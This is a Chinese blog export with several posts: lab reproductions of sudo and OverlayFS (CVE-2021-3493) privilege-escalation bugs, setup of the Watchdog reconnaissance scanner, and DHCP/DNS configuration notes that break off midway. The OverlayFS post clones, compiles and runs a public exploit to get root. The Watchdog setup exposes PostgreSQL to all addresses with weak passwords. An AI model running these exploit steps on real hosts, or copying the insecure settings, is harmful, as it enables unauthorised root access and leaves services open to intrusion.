<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/target.png"></p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="http://blog.nsfocus.net/cve-2021-3156/">http://blog.nsfocus.net/cve-2021-3156/</a></p>
<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/Rain99-/p/14354452.html">https://www.cnblogs.com/Rain99-/p/14354452.html</a></p>
<p><a href="https://www.cnblogs.com/yujin2020/p/14377503.html">https://www.cnblogs.com/yujin2020/p/14377503.html</a></p>
<p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113447282">https://blog.csdn.net/xuandao_ahfengren/article/details/113447282</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Linux 漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>内核提权 CVE-2021-3493 漏洞复现</title>
    <url>/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p><strong>OverlayFS</strong> 是一种叠合式文件系统，能够在底层文件系统上叠加另一个文件系统</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Linux 内核中 overlayfs 文件系统是 Ubuntu 的特定问题，由于没有正确的验证文件系统功能在用户名称空间中的应用，从而导致攻击者可以安装一个允许未授权挂载的 overlayfs 修补程序来提升权限</p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Ubuntu 20.10</p>
<p>Ubuntu 20.04 LTS</p>
<p>Ubuntu 18.04 LTS</p>
<p>Ubuntu 16.04 LTS</p>
<p>Ubuntu 14.04 ESM</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  下载 ubuntu 20.04.1 镜像</span><br><span class="line">http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;releases&#x2F;20.04.1&#x2F;ubuntu-20.04.1-desktop-amd64.iso</span><br><span class="line"></span><br><span class="line">#  如上述链接访问失败，则访问如下链接进行下载</span><br><span class="line">http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;releases&#x2F;20.04.1&#x2F;</span><br></pre></td></tr></table></figure>
<p>安装步骤参考：<a href="https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html">https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html</a></p>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、进入系统后先尝试下载 <a href="https://github.com/ASkyeye/CVE-2021-3493.git">POC</a> ，看看是否有对当前所在的文件夹有写入的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ASkyeye&#x2F;CVE-2021-3493.git</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/1.png"></p>
<p>此时可发现当用户对 “/“ 目录没有写入权限，此时需要进入一个有写入权限的目录进行下载（普通用户有写入权限的目录常见为：/tmp、桌面、/home/用户名）</p>
<p>2、进入一个有写入权限的目录，然后重新尝试下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ASkyeye&#x2F;CVE-2021-3493.git</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/2.png"></p>
<p>3、下载完后进入目录，然后进行编译，最后再给编译完后的文件添加执行权限并运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd CVE-2021-3493&#x2F;</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">chmod +x exploit.c</span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/3.png"></p>
<p>此时可看到已获取到管理员权限（ ”#“ 号代表管理员权限）</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/4.png"></p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新到新版本</p>
<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p>
<p><a href="https://ubuntu.com/security/CVE-2021-3493">https://ubuntu.com/security/CVE-2021-3493</a></p>
<p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52</a></p>
<p><a href="https://www.openwall.com/lists/oss-security/2021/04/16/1">https://www.openwall.com/lists/oss-security/2021/04/16/1</a></p>
<p><a href="https://github.com/ASkyeye/CVE-2021-3493">https://github.com/ASkyeye/CVE-2021-3493</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Watchdog</title>
    <url>/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/</url>
    <content><![CDATA[<h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><p>详细参考：<a href="https://github.com/CTF-MissFeng/Watchdog">https://github.com/CTF-MissFeng/Watchdog</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 Python</span><br><span class="line">sudo apt-get install python3 python3-pip -y</span><br><span class="line">#  安装 Python 相关环境</span><br><span class="line">sudo apt install build-essential libssl-dev libffi-dev python3-dev -y</span><br><span class="line"></span><br><span class="line">#  安装 Nmap</span><br><span class="line">sudo apt install nmap -y</span><br><span class="line">#  安装 Chromium 浏览器</span><br><span class="line">sudo apt-get install chromium-browser -y</span><br><span class="line"></span><br><span class="line">#  下载环境</span><br><span class="line">mkdir &#x2F;test</span><br><span class="line">cd &#x2F;test</span><br><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;CTF-MissFeng&#x2F;Watchdog.git</span><br><span class="line">#  安装文件内的库</span><br><span class="line">sudo pip3 install -r &#x2F;test&#x2F;Watchdog&#x2F;requirements.txt</span><br></pre></td></tr></table></figure>
<h2 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 PostgreSQL数据库</span><br><span class="line">sudo apt install postgresql postgresql-contrib -y</span><br><span class="line">#  指定 postgres 用户打开客户端工具 psql</span><br><span class="line">sudo -u postgres psql</span><br><span class="line">#  设置 postgres 用户密码（设置完后按 Ctrl + z 退出）</span><br><span class="line">\password postgres</span><br><span class="line"></span><br><span class="line">#  备份 PostgreSQL数据库 配置文件</span><br><span class="line">sudo cp -a &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf.bak_2021.2.8</span><br><span class="line"></span><br><span class="line">#  设置 PostgreSQL 数据库允许远程访问</span><br><span class="line">sudo sed -i &quot;60i listen_addresses &#x3D; &#39;*&#39;&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -i &quot;88i host  all  all 0.0.0.0&#x2F;0 md5&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br><span class="line"></span><br><span class="line">#  查看是否写入</span><br><span class="line">sed -n &quot;58,62p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -n &quot;86,89p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br></pre></td></tr></table></figure>
<h2 id="修改-Watchdog-配置文件"><a href="#修改-Watchdog-配置文件" class="headerlink" title="修改 Watchdog 配置文件"></a>修改 Watchdog 配置文件</h2><h3 id="修改-web-数据库连接设置"><a href="#修改-web-数据库连接设置" class="headerlink" title="修改 web 数据库连接设置"></a>修改 web 数据库连接设置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  修改 web 数据库连接设置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-1.png"></p>
<h3 id="修改-client-数据库连接配置"><a href="#修改-client-数据库连接配置" class="headerlink" title="修改 client 数据库连接配置"></a>修改 client 数据库连接配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py.bak_2020.2.8</span><br><span class="line">#  修改 client 数据库连接配置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line"></span><br><span class="line">#  重启数据库服务</span><br><span class="line">sudo systemctl restart postgresql</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-2.png"></p>
<h3 id="添加-shodan-api"><a href="#添加-shodan-api" class="headerlink" title="添加 shodan api"></a>添加 shodan api</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  在域名扫描的工具模块内添加 shodan api（将此处命令中的 test 替换成 api）</span><br><span class="line">sudo sed -i &#39;s&#x2F;xxxxxx&#x2F;test&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/shodan_api.png"></p>
<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改测试账户的密码为12345678（测试账户密码需大于或等于 8 位，否则将无法登陆 web）</span><br><span class="line">sudo sed -i &#39;s&#x2F;qazxsw@123&#x2F;12345678&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;app.py</span><br><span class="line">#  配置环境变量</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">export FLASK_APP&#x3D;app.py:APP</span><br><span class="line">#  查看帮助文档</span><br><span class="line">sudo flask --help</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户（如没修改账号跟密码则默认为：root&#x2F;qazxsw@123）</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/start.png"></p>
<h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><h3 id="添加厂商"><a href="#添加厂商" class="headerlink" title="添加厂商"></a>添加厂商</h3><p>运行脚本前需添加厂商</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-1.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-2.png"></p>
<h3 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动子域名扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall</span><br><span class="line">sudo python3 -u sbudomain_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u sbudomain_run.py &gt; dns.log 2&gt;&amp;1 &amp;</span><br><span class="line"># 查看日志</span><br><span class="line">cat dns.log</span><br></pre></td></tr></table></figure>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动端口扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;portscan</span><br><span class="line">sudo python3 -u portscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u portscan_run.py &gt; port.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat port.log</span><br></pre></td></tr></table></figure>
<h3 id="url-扫描"><a href="#url-扫描" class="headerlink" title="url 扫描"></a>url 扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动url扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;url_probe  </span><br><span class="line">sudo python3 -u urlscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u urlscan_run.py &gt; url.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat url.log</span><br></pre></td></tr></table></figure>
<h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动xray</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;xray</span><br><span class="line">sudo python3 -u xray_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u xray_run.py &gt; xray.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat xray.log</span><br></pre></td></tr></table></figure>
<h3 id="重置环境"><a href="#重置环境" class="headerlink" title="重置环境"></a>重置环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  进入 Watchdog 目录</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">#  重置数据库</span><br><span class="line">sudo flask resetdb</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>DHCP</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DHCP/DHCP/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>DHCP（动态主机配置协议）是一个局域网的网络协议。为主机分配 IP 地址。</p>
<p>安装：<code>yum -y install dhcp</code><br>默认端口：<code>67/68</code><br>主配置文件：<code>/etc/dhcp/dhcpd.conf</code><br>模板文件：<code>/usr/share/doc/dhcp-4.2.5/dhcpd.conf.example</code><br>执行程序：<code>/usr/sbin/dhcpd、/usr/sbin/dhcrelay</code><br>执行参数配置：<code>/etc/sysconfig/dhcpd</code><br>查看租约文件：<code>/var/lib/dhcpd/dhcpd.lease</code><br>网络服务的排错日志：<code>/var/log/messages</code></p>
<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log-facility local7;    #  指定日志文件</span><br><span class="line">ddns-update-style none; #  设置 DNS 的更新方式（可用参数：standard、interim、none）</span><br><span class="line">ignore client-updates;  #  不允许客户端更新 DNS 记录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;	#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;		#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、拷贝模板文件"><a href="#1、拷贝模板文件" class="headerlink" title="1、拷贝模板文件"></a>1、拷贝模板文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  删除原配置文件（原配置文件内无参数）</span><br><span class="line">rm -f &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  拷贝模板文件并更名为配置文件</span><br><span class="line">cp -p &#x2F;usr&#x2F;share&#x2F;doc&#x2F;dhcp-4.2.5&#x2F;dhcpd.conf.example &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  备份配置文件</span><br><span class="line">cp -p &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf.bak_2020.11.13</span><br></pre></td></tr></table></figure>
<h3 id="2、编辑配置文件"><a href="#2、编辑配置文件" class="headerlink" title="2、编辑配置文件"></a>2、编辑配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  可在配置文件内只保留如下内容（配置文件内有该内容）</span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;	#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;		#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DNS/DNS/</url>
    <content><![CDATA[<h2 id="配置-DNS"><a href="#配置-DNS" class="headerlink" title="配置 DNS"></a>配置 DNS</h2><p><strong>一、简介</strong></p>
<p>把域名翻译成IP地址的软件称为域名系统，即 DNS<br>默认端口号：<code>53</code></p>
<p><strong>默认配置文件路径：</strong></p>
<p>主要配置文件（定义 bind 服务程序的运行）： <code>/etc/named.conf</code><br>区域配置文件（保存域名和IP地址对应关系的所在位置）： <code>/etc/named.rfc1912.zones</code><br>数据文件目录： <code>/var/named</code></p>
<p>DNS域名解析的配置文件（系统自带）： <code>/etc/resolv.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  resolv.conf 参数详解</span><br><span class="line"></span><br><span class="line">nameserver	#  定义 DNS 服务器的 IP 地址（查询时按照 namserver 在文件中的顺序进行）</span><br><span class="line">domain		#  定义本地域名</span><br><span class="line">search		#  定义域名的搜索列表（当查询的域名没找到时，则从该参数声明的域中按前后顺序查找）</span><br><span class="line">sortlist	#  对返回的域名进行排序</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="二、实例"><a href="#二、实例" class="headerlink" title="二、实例"></a>二、实例</h2><p><strong>环境：</strong></p>
<p>centos 7，IP：10.1.82.232</p>
<h3 id="1、安装相关包"><a href="#1、安装相关包" class="headerlink" title="1、安装相关包"></a>1、安装相关包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 dns 相关包（bind：DNS 服务程序，bind-utils：提供 DNS 工具包（域名解析和DNS调试））</span><br><span class="line">yum -y install bind bind-utils</span><br></pre></td></tr></table></figure>
<h3 id="2、编辑主要配置文件"><a href="#2、编辑主要配置文件" class="headerlink" title="2、编辑主要配置文件"></a>2、编辑主要配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.conf     #  编辑 named.conf</span><br><span class="line"></span><br><span class="line">将    listen-on port 53 &#123; 127.0.0.1; &#125;;  跟  allow-query     &#123; localhost; &#125;;</span><br><span class="line">改为  listen-on port 53 &#123; any; &#125;;        和  allow-query     &#123; any; &#125;; 即可</span><br></pre></td></tr></table></figure>
<p><code>named.conf</code> 配置文件详解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  named.conf 配置文件详解</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; named.conf</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Provided by Red Hat bind package to configure the ISC BIND named(8) DNS</span><br><span class="line">&#x2F;&#x2F; server as a caching only nameserver (as a localhost DNS resolver only).</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind*&#x2F;sample&#x2F; for example named configuration files.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See the BIND Administrator&#39;s Reference Manual (ARM) for details about the</span><br><span class="line">&#x2F;&#x2F; configuration located in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind-&#123;version&#125;&#x2F;Bv9ARM.html</span><br><span class="line"></span><br><span class="line">options &#123;</span><br><span class="line">	listen-on port 53 &#123; any; &#125;;                   #  允许所有 IP 监听本机 53 端口（即所有用户能与本机的 DNS 进行通信）</span><br><span class="line">	listen-on-v6 port 53 &#123; ::1; &#125;;                #  IPV6 监听地址</span><br><span class="line">	directory 	&quot;&#x2F;var&#x2F;named&quot;;		              #  服务器的工作目录</span><br><span class="line">	dump-file 	&quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;cache_dump.db&quot;;  #  当执行 rndc dumpdb 时服务器 dump 文件的路径</span><br><span class="line">	statistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_stats.txt&quot;;		    #  当服务器接收到 rndc stats 命令时，追加统计数据的文件路径</span><br><span class="line">	memstatistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_mem_stats.txt&quot;;	#  当退出服务器时，会将服务器的统计信息写道文件中</span><br><span class="line">	allow-query     &#123; any; &#125;;		              #  允许所有 IP 进行 DNS 查询</span><br><span class="line"></span><br><span class="line">	&#x2F;* </span><br><span class="line">	 - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.</span><br><span class="line">	 - If you are building a RECURSIVE (caching) DNS server, you need to enable </span><br><span class="line">	   recursion. </span><br><span class="line">	 - If your recursive DNS server has a public IP address, you MUST enable access </span><br><span class="line">	   control to limit queries to your legitimate users. Failing to do so will</span><br><span class="line">	   cause your server to become part of large scale DNS amplification </span><br><span class="line">	   attacks. Implementing BCP38 within your network would greatly</span><br><span class="line">	   reduce such attack surface </span><br><span class="line">	*&#x2F;</span><br><span class="line">	recursion yes;		    #  允许进行递归搜索</span><br><span class="line"></span><br><span class="line">	dnssec-enable yes;      #  开启 DNSSEC 开关</span><br><span class="line">	dnssec-validation yes;	#  开启 DNSSEC 确认开关</span><br><span class="line"></span><br><span class="line">	&#x2F;* Path to ISC DLV key *&#x2F;</span><br><span class="line">	bindkeys-file &quot;&#x2F;etc&#x2F;named.iscdlv.key&quot;;		    #  加密用的 key</span><br><span class="line"></span><br><span class="line">	managed-keys-directory &quot;&#x2F;var&#x2F;named&#x2F;dynamic&quot;;	#  管理密钥的路径</span><br><span class="line"></span><br><span class="line">	pid-file &quot;&#x2F;run&#x2F;named&#x2F;named.pid&quot;;		        #  服务器记录进程 ID 的文件路径</span><br><span class="line">	session-keyfile &quot;&#x2F;run&#x2F;named&#x2F;session.key&quot;;	    #  